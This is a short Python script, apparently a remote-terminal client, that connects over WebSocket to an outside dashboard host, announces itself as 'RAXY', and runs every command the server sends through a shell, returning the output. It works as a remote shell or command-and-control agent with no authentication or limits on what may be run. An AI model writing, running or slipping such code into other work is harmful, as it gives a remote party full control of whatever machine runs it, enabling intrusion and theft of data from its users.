import asyncio
import websockets
import subprocess

async def connect_to_server():
    uri = "wss://raxy-terminal-dashboard.onrender.com"

    async with websockets.connect(uri) as websocket:
        print("Connected to WebSocket Server")

        # Identify client
        await websocket.send("ROLE:RAXY")

        while True:
            # Wait for command from dashboard
            command = await websocket.recv()

            print("Command Received:", command)

            try:
                result = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT
                )

                output = result.decode()

            except subprocess.CalledProcessError as e:
                output = e.output.decode()

            # Send result back
            await websocket.send(output)

asyncio.run(connect_to_server())